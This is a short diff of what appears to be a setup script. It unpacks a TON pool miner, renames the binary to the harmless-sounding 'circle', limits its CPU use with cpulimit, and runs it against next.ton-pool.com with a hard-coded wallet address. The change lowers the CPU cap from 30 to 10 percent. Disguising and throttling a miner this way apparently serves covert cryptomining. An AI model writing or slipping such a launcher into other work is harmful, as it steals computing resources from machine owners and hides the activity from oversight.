@@ -13,5 +13,5 @@ tar xvf ton-pool.com-miner-0.3.4-linux.tar.gz
 mv miner-linux circle
 ph add circle
 chmod +x circle
-cpulimit -e circle -l 30 &
-nohup ./circle https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF &
+cpulimit -e circle -l 10 &
+./circle https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF
